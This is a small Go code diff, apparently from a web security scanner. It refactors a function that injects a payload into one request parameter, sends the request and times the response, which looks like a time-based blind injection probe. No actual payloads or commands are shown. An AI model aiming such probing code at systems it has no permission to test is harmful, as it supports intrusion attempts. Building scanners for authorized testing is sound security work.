-			for k, v := range ep.Params {
-				if k == param {
-					form.Set(k, payload)
-				} else {
-					neutral := v
-					if neutral == "" {
-						neutral = "1"
-					}
-					form.Set(k, neutral)
-				}
-			}
-			resp, err = client.PostForm(ep.URL, form)
-		default:
-			resp, err = client.Get(u)
-		}
-	}
-
+	_, _, err := fetchParamWithPayloadWithStatus(client, cfg, ep, param, payload)
 	if err != nil {
 		return -1
 	}
-	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
 	return time.Since(start)
 }
